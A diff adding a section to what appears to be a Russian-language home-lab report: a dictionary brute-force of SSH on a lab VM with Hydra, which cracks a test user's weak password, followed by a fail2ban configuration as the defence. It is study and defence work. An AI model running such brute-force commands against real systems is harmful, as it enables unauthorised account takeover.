@@ -46,4 +46,33 @@
 
 ## 3. Brute-force SSH (подбор пароля)
 
-*(Этот раздел будет добавлен после выполнения следующей атаки)*
+**Суть атаки:** Перебор паролей по словарю для получения доступа к SSH.
+
+### Что было сделано
+
+1. Создан тестовый пользователь на Ubuntu:
+   `sudo useradd -m -s /bin/bash testuser`
+   Пароль: `12345` (слабый, для теста).
+
+2. Подготовлен словарь на Kali:
+   `echo -e "password\n123456\n12345\nqwerty\nadmin\nletmein" > /tmp/passwords.txt`
+
+3. Запущен Brute-force с помощью Hydra:
+   `hydra -l testuser -P /tmp/passwords.txt ssh://192.168.56.102`
+
+4. **Результат:** пароль `12345` подобран успешно.
+
+### Защита (fail2ban)
+
+1. Установлен fail2ban на Ubuntu:
+`sudo apt install -y fail2ban`
+
+2. Настроен конфиг `/etc/fail2ban/jail.local`:
+```ini
+[sshd]
+enabled = true
+port = ssh
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 600
